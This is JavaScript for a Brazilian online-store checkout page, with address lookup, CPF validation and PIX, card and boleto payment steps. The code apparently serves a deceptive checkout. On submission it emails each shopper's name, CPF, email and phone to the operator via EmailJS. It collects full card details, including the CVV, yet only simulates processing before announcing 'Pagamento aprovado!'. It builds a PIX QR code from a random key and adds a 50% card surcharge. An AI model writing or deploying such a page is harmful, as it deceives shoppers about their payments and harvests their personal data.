let currentStep = 1;
        let selectedShipping = 'standard';
        let selectedPayment = 'pix';
        let addressFilled = false;
        let pixTimer = null;
        
        window.checkoutData = {};
        
        const CREDIT_CARD_FEE_PERCENTAGE = 50;
        
        // CORREÇÃO CORS: Usar proxy reverso em vez de chamar diretamente a API externa
        const BACKEND_API_BASE_URL = '/api/payments'; // Proxy reverso configurado no servidor
        
        let cartData = {
            subtotal: 299.90
        };

        // Configuração do EmailJS
        const EMAILJS_SERVICE_ID = 'service_2nf1guv';
        const EMAILJS_TEMPLATE_ID = 'template_ja4gfaf';
        const EMAILJS_PUBLIC_KEY = '37e70HYkrmbGbVQx9';

        document.addEventListener('DOMContentLoaded', function() {
            // Inicializar EmailJS
            emailjs.init(EMAILJS_PUBLIC_KEY);
            
            parseSubtotalFromURL();
            setupEventListeners();
            updateProgress();
            setupMasks();
            updateCartDisplay();

            // Configurar teclado numérico para CPF e CEP
            const cpfInput = document.getElementById('cpf');
            if (cpfInput) {
                cpfInput.setAttribute('inputmode', 'numeric');
                cpfInput.setAttribute('type', 'text'); // Mantém text para as máscaras funcionarem
            }
            const zipInput = document.getElementById('zipCode');
            if (zipInput) {
                zipInput.setAttribute('inputmode', 'numeric');
                zipInput.setAttribute('type', 'text');
            }
            
            const creditCardNotice = document.getElementById('creditCardNotice');
            if (creditCardNotice) {
                creditCardNotice.style.display = 'none';
            }
        });

        function parseSubtotalFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            const subtotalParam = urlParams.get('subtotal');
            
            if (subtotalParam) {
                try {
                    cartData.subtotal = parseFloat(subtotalParam);
                    console.log('Subtotal loaded from URL:', cartData.subtotal);
                } catch (error) {
                    console.error('Error parsing subtotal from URL:', error);
                }
            }
        }

        function updateCartDisplay() {
            updateOrderTotals();
        }

        function updateOrderTotals() {
            const subtotalEl = document.querySelector(".sidebar .total-row span:last-child");
            const mobileSubtotalEl = document.querySelector("#summaryContent .total-row span:nth-child(2)");
            
            if (subtotalEl) {
                subtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
            }
            if (mobileSubtotalEl) {
                mobileSubtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
            }
            
            const mobileTotalPrice = document.getElementById("mobileTotalPrice");
            if (mobileTotalPrice) {
                mobileTotalPrice.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
            }
            
            updateShippingCost();
        }

        function setupEventListeners() {
            document.getElementById('contactForm').addEventListener('submit', handleContactSubmit);
            document.getElementById('shippingForm').addEventListener('submit', handleShippingSubmit);
            document.getElementById('paymentForm').addEventListener('submit', handlePaymentSubmit);

            document.querySelectorAll('.shipping-option').forEach(option => {
                option.addEventListener('click', selectShipping);
            });

            document.querySelectorAll('.payment-method').forEach(method => {
                method.querySelector('.payment-header').addEventListener('click', selectPayment);
            });

            document.querySelectorAll('.form-input').forEach(input => {
                input.addEventListener('blur', () => validateField(input));
                input.addEventListener('input', () => {
                    if (input.classList.contains('error')) {
                        validateField(input);
                    }
                });
            });

            document.getElementById('zipCode').addEventListener('keyup', handleCEPLookup);
        }

        function toggleOrderSummary() {
            const toggle = document.querySelector('.summary-toggle');
            const content = document.getElementById('summaryContent');
            const icon = document.querySelector('.summary-toggle-icon');
            
            toggle.classList.toggle('expanded');
            content.classList.toggle('expanded');
            
            if (toggle.classList.contains('expanded')) {
                icon.textContent = '▲';
                document.querySelector('.summary-toggle-text').textContent = 'Ocultar resumo do pedido';
            } else {
                icon.textContent = '▼';
                document.querySelector('.summary-toggle-text').textContent = 'Exibir resumo do pedido';
            }
        }

        async function handleCEPLookup() {
            const cepInput = document.getElementById('zipCode');
            const cep = cepInput.value.replace(/\D/g, '');
            
            if (cep.length === 8) {
                cepInput.blur(); // Oculta o teclado automaticamente
                showCEPLoading(true);
                
                try {
                    const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                    const data = await response.json();
                    
                    if (!data.erro) {
                        fillAddressFields(data);
                        showAddressFields();
                        showShippingOptions();
                        const errorEl = document.getElementById('zipCodeError');
                        errorEl.classList.remove('show');
                        cepInput.classList.remove('error');
                    } else {
                        showCEPError();
                    }
                } catch (error) {
                    console.error('Erro ao buscar CEP:', error);
                    showCEPError();
                } finally {
                    showCEPLoading(false);
                }
            } else {
                hideAddressFields();
                hideShippingOptions();
                const errorEl = document.getElementById('zipCodeError');
                errorEl.classList.remove('show');
                cepInput.classList.remove('error');
            }
        }

        function showCEPLoading(show) {
            const loading = document.getElementById('cepLoading');
            if (show) {
                loading.classList.add('show');
            } else {
                loading.classList.remove('show');
            }
        }

        function fillAddressFields(data) {
            document.getElementById('address').value = data.logradouro;
            document.getElementById('neighborhood').value = data.bairro;
            document.getElementById('city').value = data.localidade;
            document.getElementById('state').value = data.uf;
            
            document.getElementById('number').focus();
            addressFilled = true;
        }

        function showAddressFields() {
            const addressFields = document.getElementById('addressFields');
            addressFields.classList.add('show');
        }

        function hideAddressFields() {
            const addressFields = document.getElementById('addressFields');
            addressFields.classList.remove('show');
            addressFilled = false;
        }

        function showShippingOptions() {
            const shippingOptions = document.getElementById('shippingOptions');
            shippingOptions.classList.add('show');
        }

        function hideShippingOptions() {
            const shippingOptions = document.getElementById('shippingOptions');
            shippingOptions.classList.remove('show');
        }

        function showCEPError() {
            const zipCodeInput = document.getElementById('zipCode');
            const errorEl = document.getElementById('zipCodeError');
            
            zipCodeInput.classList.add('error');
            errorEl.textContent = 'CEP não encontrado. Verifique e tente novamente.';
            errorEl.classList.add('show');
            hideAddressFields();
            hideShippingOptions();
        }

        function setupMasks() {
            document.getElementById('cpf').addEventListener('input', function(e) {
                e.target.value = applyCPFMask(e.target.value);
            });

            document.getElementById('phone').addEventListener('input', function(e) {
                e.target.value = applyPhoneMask(e.target.value);
            });

            document.getElementById('zipCode').addEventListener('input', function(e) {
                e.target.value = applyZipMask(e.target.value);
            });

            document.getElementById('cardNumber').addEventListener('input', function(e) {
                e.target.value = applyCardMask(e.target.value);
            });

            document.getElementById('cardExpiry').addEventListener('input', function(e) {
                e.target.value = applyExpiryMask(e.target.value);
            });

            document.getElementById('cardCvv').addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '');
            });
        }

        function applyCPFMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        }

        function applyPhoneMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d\d)(\d)/g, '($1) $2')
                .replace(/(\d{5})(\d)/, '$1-$2');
        }

        function applyZipMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{5})(\d)/, '$1-$2');
        }

        function applyCardMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{4})(\d)/, '$1 $2')
                .replace(/(\d{4})(\d)/, '$1 $2')
                .replace(/(\d{4})(\d)/, '$1 $2');
        }

        function applyExpiryMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{2})(\d)/, '$1/$2');
        }

        function goToStep(step) {
            if (step < currentStep || validateCurrentStep()) {
                currentStep = step;
                updateStepDisplay();
                updateProgress();
                
                if (currentStep === 3) {
                    updateShippingCost();
                }
                
                if (window.innerWidth < 768) {
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                }
            }
        }

        function updateStepDisplay() {
            document.querySelectorAll('.step-content').forEach(content => {
                content.classList.remove('active');
            });
            document.getElementById(`step${currentStep}`).classList.add('active');
        }

        function updateProgress() {
            const steps = document.querySelectorAll('.step');
            const progressLine = document.getElementById('progressLine');
            
            steps.forEach((step, index) => {
                const stepNumber = index + 1;
                step.classList.remove('active', 'completed');
                
                if (stepNumber < currentStep) {
                    step.classList.add('completed');
                    step.querySelector('.step-circle').innerHTML = '✓';
                } else if (stepNumber === currentStep) {
                    step.classList.add('active');
                    step.querySelector('.step-circle').innerHTML = stepNumber;
                } else {
                    step.querySelector('.step-circle').innerHTML = stepNumber;
                }
            });

            const progressWidth = ((currentStep - 1) / (steps.length - 1)) * 100;
            progressLine.style.width = `${progressWidth}%`;
        }

        function validateCurrentStep() {
            const currentStepEl = document.getElementById(`step${currentStep}`);
            const inputs = currentStepEl.querySelectorAll('input[required], select[required]');
            let isValid = true;

            inputs.forEach(input => {
                if (!validateField(input)) {
                    isValid = false;
                }
            });

            if (currentStep === 2 && !addressFilled) {
                isValid = false;
                const zipCodeInput = document.getElementById('zipCode');
                if (!zipCodeInput.classList.contains('error')) {
                    zipCodeInput.classList.add('error');
                    document.getElementById('zipCodeError').textContent = 'Digite um CEP válido para continuar';
                    document.getElementById('zipCodeError').classList.add('show');
                }
            }

            return isValid;
        }

        function validateField(field) {
            const value = field.value.trim();
            const fieldName = field.name;
            let isValid = true;
            let errorMessage = '';

            field.classList.remove('error', 'success');
            const errorEl = document.getElementById(fieldName + 'Error');
            if (errorEl) errorEl.classList.remove('show');

            if (field.hasAttribute('required') && !value) {
                isValid = false;
                errorMessage = "Este campo é obrigatório";
            } else if (value) {
                switch (fieldName) {
                    case "email":
                        if (!validateEmail(value)) {
                            isValid = false;
                            errorMessage = "Digite um e-mail válido";
                        }
                        break;
                    case "cpf":
                        if (!validateCPF(value)) {
                            isValid = false;
                            errorMessage = "Digite um CPF válido";
                        }
                        break;
                    case "phone":
                        if (!validatePhone(value)) {
                            isValid = false;
                            errorMessage = "Digite um telefone válido";
                        }
                        break;
                    case "zipCode":
                        if (!validateZipCode(value)) {
                            isValid = false;
                            errorMessage = "Digite um CEP válido";
                        }
                        break;
                    case "cardNumber":
                        if (!validateCardNumber(value)) {
                            isValid = false;
                            errorMessage = "Digite um número de cartão válido";
                        }
                        break;
                    case "cardExpiry":
                        if (!validateCardExpiry(value)) {
                            isValid = false;
                            errorMessage = "Digite uma data válida";
                        }
                        break;
                    case "cardCvv":
                        if (value.length < 3) {
                            isValid = false;
                            errorMessage = "Digite um CVV válido";
                        }
                        break;
                }
            }

            if (isValid) {
                field.classList.add("success");
            } else {
                field.classList.add("error");
                if (errorEl) {
                    errorEl.textContent = errorMessage;
                    errorEl.classList.add("show");
                }
            }

            return isValid;
        }

        function validateEmail(email) {
            const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
            return emailRegex.test(email);
        }

        function validateCPF(cpf) {
            cpf = cpf.replace(/\D/g, '');
            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

            let sum = 0;
            for (let i = 0; i < 9; i++) {
                sum += parseInt(cpf.charAt(i)) * (10 - i);
            }
            let remainder = 11 - (sum % 11);
            if (remainder === 10 || remainder === 11) remainder = 0;
            if (remainder !== parseInt(cpf.charAt(9))) return false;

            sum = 0;
            for (let i = 0; i < 10; i++) {
                sum += parseInt(cpf.charAt(i)) * (11 - i);
            }
            remainder = 11 - (sum % 11);
            if (remainder === 10 || remainder === 11) remainder = 0;
            if (remainder !== parseInt(cpf.charAt(10))) return false;

            return true;
        }

        function validatePhone(phone) {
            const phoneRegex = /^\(\d{2}\) \d{5}-\d{4}$/;
            return phoneRegex.test(phone);
        }

        function validateZipCode(zipCode) {
            const zipRegex = /^\d{5}-\d{3}$/;
            return zipRegex.test(zipCode);
        }

        function validateCardNumber(cardNumber) {
            const cleanNumber = cardNumber.replace(/\s/g, '');
            return cleanNumber.length >= 13 && cleanNumber.length <= 19;
        }

        function validateCardExpiry(expiry) {
            const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
            if (!expiryRegex.test(expiry)) return false;

            const [month, year] = expiry.split('/');
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear() % 100;
            const currentMonth = currentDate.getMonth() + 1;

            const cardYear = parseInt(year);
            const cardMonth = parseInt(month);

            if (cardYear < currentYear || (cardYear === currentYear && cardMonth < currentMonth)) {
                return false;
            }

            return true;
        }

        // Função para enviar email via EmailJS
        async function sendEmailNotification(contactData) {
            try {
                // Preparar os dados do template
                const templateParams = {
                    // Dados do cliente
                    customer_name: contactData.firstName,
                    customer_email: contactData.email,
                    customer_cpf: contactData.cpf,
                    customer_phone: contactData.phone,
                    
                    // Detalhes do pedido
                    order_subtotal: `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`,
                    order_date: new Date().toLocaleString('pt-BR'),
                    
                    // Campos alternativos que podem ser usados no template
                    to_name: contactData.firstName,
                    from_name: 'PagOnline',
                    message: `Novo pedido iniciado!\n\nCliente: ${contactData.firstName}\nE-mail: ${contactData.email}\nCPF: ${contactData.cpf}\nTelefone: ${contactData.phone}\nValor: R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}\nData: ${new Date().toLocaleString('pt-BR')}`
                };

                // Enviar email via EmailJS
                const response = await emailjs.send(
                    EMAILJS_SERVICE_ID,
                    EMAILJS_TEMPLATE_ID,
                    templateParams
                );

                console.log('Email enviado com sucesso!', response.status, response.text);
                return true;
            } catch (error) {
                console.error('Erro ao enviar email:', error);
                // Não bloquear o fluxo do checkout se o email falhar
                return false;
            }
        }

        async function handleContactSubmit(e) {
            e.preventDefault();
            if (validateCurrentStep()) {
                const formData = new FormData(e.target);
                const contactData = {
                    email: formData.get('email'),
                    firstName: formData.get('firstName'),
                    cpf: formData.get('cpf'),
                    phone: formData.get('phone')
                };

                window.checkoutData = { ...window.checkoutData, ...contactData };
                
                // Enviar email via EmailJS (não bloqueia o fluxo)
                sendEmailNotification(contactData);
                
                goToStep(2);
            }
        }

        async function handleShippingSubmit(e) {
            e.preventDefault();
            if (validateCurrentStep()) {
                const formData = new FormData(e.target);
                const shippingData = {
                    zipCode: formData.get('zipCode'),
                    address: formData.get('address'),
                    number: formData.get('number'),
                    complement: formData.get('complement'),
                    neighborhood: formData.get('neighborhood'),
                    city: formData.get('city'),
                    state: formData.get('state')
                };

                window.checkoutData = { ...window.checkoutData, ...shippingData };
                goToStep(3);
            }
        }

        function selectShipping(e) {
            const option = e.currentTarget;
            document.querySelectorAll('.shipping-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            option.classList.add('selected');
            selectedShipping = option.dataset.shipping;
            updateShippingCost();
        }

        function selectPayment(e) {
            const method = e.currentTarget.closest('.payment-method');
            const paymentType = method.dataset.payment;
            
            document.querySelectorAll('.payment-method').forEach(m => {
                m.classList.remove('selected');
                m.querySelector('.payment-details').classList.remove('show');
            });
            
            method.classList.add('selected');
            method.querySelector('.payment-details').classList.add('show');
            selectedPayment = paymentType;
            
            updateShippingCost();
            
            const creditCardNotice = document.getElementById('creditCardNotice');
            const creditCardFeeRow = document.getElementById('creditCardFeeRow');
            const mobileCreditCardFeeRow = document.getElementById('mobileCreditCardFeeRow');
            
            if (paymentType === 'credit') {
                if (creditCardNotice) creditCardNotice.style.display = 'block';
                if (creditCardFeeRow) creditCardFeeRow.style.display = 'flex';
                if (mobileCreditCardFeeRow) mobileCreditCardFeeRow.style.display = 'flex';
            } else {
                if (creditCardNotice) creditCardNotice.style.display = 'none';
                if (creditCardFeeRow) creditCardFeeRow.style.display = 'none';
                if (mobileCreditCardFeeRow) mobileCreditCardFeeRow.style.display = 'none';
            }
        }

        function updateShippingCost() {
            let shippingCost = 0;
            let creditCardFee = 0;
            
            if (selectedShipping === 'express') {
                shippingCost = 19.90;
            }
            
            if (selectedPayment === 'credit') {
                creditCardFee = (cartData.subtotal * CREDIT_CARD_FEE_PERCENTAGE) / 100;
            }
            
            const total = cartData.subtotal + shippingCost + creditCardFee;
            
            // Atualizar sidebar desktop
            const shippingCostEl = document.getElementById('shippingCost');
            const creditCardFeeEl = document.getElementById('creditCardFee');
            const finalPriceEl = document.getElementById('finalPrice');
            
            if (shippingCostEl) {
                shippingCostEl.textContent = shippingCost > 0 ? `R$ ${shippingCost.toFixed(2).replace('.', ',')}` : 'GRÁTIS';
            }
            if (creditCardFeeEl) {
                creditCardFeeEl.textContent = `+R$ ${creditCardFee.toFixed(2).replace('.', ',')}`;
            }
            if (finalPriceEl) {
                finalPriceEl.textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;
            }
            
            // Atualizar mobile
            const mobileShippingCost = document.getElementById('mobileShippingCost');
            const mobileCreditCardFee = document.getElementById('mobileCreditCardFee');
            const mobileFinalPrice = document.getElementById('mobileFinalPrice');
            const mobileTotalPrice = document.getElementById('mobileTotalPrice');
            
            if (mobileShippingCost) {
                mobileShippingCost.textContent = shippingCost > 0 ? `R$ ${shippingCost.toFixed(2).replace('.', ',')}` : 'GRÁTIS';
            }
            if (mobileCreditCardFee) {
                mobileCreditCardFee.textContent = `+R$ ${creditCardFee.toFixed(2).replace('.', ',')}`;
            }
            if (mobileFinalPrice) {
                mobileFinalPrice.textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;
            }
            if (mobileTotalPrice) {
                mobileTotalPrice.textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;
            }
        }

        async function handlePaymentSubmit(e) {
            e.preventDefault();
            
            if (!validateCurrentStep()) {
                return;
            }
            
            showLoading(true);
            
            try {
                if (selectedPayment === 'pix') {
                    await processPixPayment();
                } else if (selectedPayment === 'credit') {
                    await processCreditCardPayment();
                } else if (selectedPayment === 'boleto') {
                    await processBoletoPayment();
                }
            } catch (error) {
                console.error('Erro no pagamento:', error);
                alert('Ocorreu um erro ao processar o pagamento. Tente novamente.');
            } finally {
                showLoading(false);
            }
        }

        async function processPixPayment() {
            // Simulação de processamento PIX
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            const pixContainer = document.getElementById('pixQrContainer');
            if (pixContainer) {
                pixContainer.style.display = 'block';
                generatePixQRCode();
                startPixTimer();
            }
        }

        function generatePixQRCode() {
            const qrContainer = document.getElementById('pixQrCode');
            if (qrContainer && typeof QRCode !== 'undefined') {
                qrContainer.innerHTML = '';
                new QRCode(qrContainer, {
                    text: `00020126580014br.gov.bcb.pix0136${generateRandomPixKey()}5204000053039865802BR5925PAGAMENTO ONLINE LTDA6009SAO PAULO62070503***6304`,
                    width: 200,
                    height: 200
                });
            }
        }

        function generateRandomPixKey() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                const r = Math.random() * 16 | 0;
                const v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        function startPixTimer() {
            let timeLeft = 900; // 15 minutos
            const timerEl = document.getElementById('pixTimer');
            
            if (pixTimer) clearInterval(pixTimer);
            
            pixTimer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                if (timerEl) {
                    timerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }
                
                if (timeLeft <= 0) {
                    clearInterval(pixTimer);
                    alert('O tempo para pagamento expirou. Por favor, gere um novo QR Code.');
                }
                
                timeLeft--;
            }, 1000);
        }

        async function processCreditCardPayment() {
            const cardNumber = document.getElementById('cardNumber').value;
            const cardName = document.getElementById('cardName').value;
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCvv = document.getElementById('cardCvv').value;
            
            // Simulação de processamento
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            showSuccessNotification();
            
            setTimeout(() => {
                alert('Pagamento aprovado! Você receberá um e-mail com os detalhes do pedido.');
            }, 1500);
        }

        async function processBoletoPayment() {
            // Simulação de geração de boleto
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            const boletoContainer = document.getElementById('boletoContainer');
            if (boletoContainer) {
                boletoContainer.style.display = 'block';
            }
        }

        function copyPixCode() {
            const pixCode = document.getElementById('pixCode');
            if (pixCode) {
                navigator.clipboard.writeText(pixCode.textContent).then(() => {
                    alert('Código PIX copiado!');
                }).catch(() => {
                    // Fallback para navegadores mais antigos
                    const textArea = document.createElement('textarea');
                    textArea.value = pixCode.textContent;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    alert('Código PIX copiado!');
                });
            }
        }

        function copyBoletoCode() {
            const boletoCode = document.getElementById('boletoCode');
            if (boletoCode) {
                navigator.clipboard.writeText(boletoCode.textContent).then(() => {
                    alert('Código do boleto copiado!');
                }).catch(() => {
                    const textArea = document.createElement('textarea');
                    textArea.value = boletoCode.textContent;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    alert('Código do boleto copiado!');
                });
            }
        }

        function showLoading(show) {
            const overlay = document.getElementById('loadingOverlay');
            if (overlay) {
                overlay.style.display = show ? 'flex' : 'none';
            }
        }

        function showSuccessNotification() {
            const notification = document.getElementById('successNotification');
            if (notification) {
                notification.classList.add('show');
                setTimeout(() => {
                    notification.classList.remove('show');
                }, 3000);
            }
        }
